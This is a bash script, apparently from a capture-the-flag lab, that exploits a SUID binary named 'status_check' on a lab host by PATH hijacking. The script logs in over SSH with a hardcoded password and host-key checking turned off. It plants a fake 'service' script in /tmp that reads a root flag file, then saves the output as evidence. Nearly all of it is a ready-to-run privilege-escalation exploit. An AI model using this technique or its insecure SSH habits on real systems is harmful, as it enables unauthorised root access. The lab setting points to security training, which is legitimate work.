#!/bin/bash
cd "/home/chifay/Whoami-Labs/Titan Linux" || exit 1
SSH="sshpass -p password123 ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no ubuntu@192.168.60.132"
clear
printf '\033]0;TITAN VECTOR 3 PATH SUID\007'
echo "=================================================================="
echo " TITAN LINUX - VECTOR 3: MANIPULACION DE PATH EN SUID status_check"
echo " Fecha: $(date)"
echo "=================================================================="
echo
echo '$ ls -la /usr/local/bin/status_check'
$SSH 'ls -la /usr/local/bin/status_check'
echo
echo '$ file /usr/local/bin/status_check'
$SSH 'file /usr/local/bin/status_check'
echo
echo '$ strings /usr/local/bin/status_check | grep -E "service|setuid|setgid"'
$SSH 'strings /usr/local/bin/status_check | grep -E "service apache2|setuid|setgid"'
echo
echo '$ cat > /tmp/p/service << EOF'
echo '#!/bin/bash'
echo 'id; echo ---FLAG---; cat /root/FLAG_LINUX_ROOT.txt'
echo 'EOF'
echo '$ chmod +x /tmp/p/service'
echo '$ PATH=/tmp/p:$PATH /usr/local/bin/status_check'
$SSH 'mkdir -p /tmp/p; printf "#!/bin/bash\nid; echo ---FLAG---; cat /root/FLAG_LINUX_ROOT.txt\n" > /tmp/p/service; chmod +x /tmp/p/service; PATH=/tmp/p:$PATH /usr/local/bin/status_check' 2>&1 | tee "evidencias/term_vector3_path_suid.txt"
echo
echo "### FIN ETAPA 3 ###"
touch /tmp/opencode/stage3.done
sleep 3600
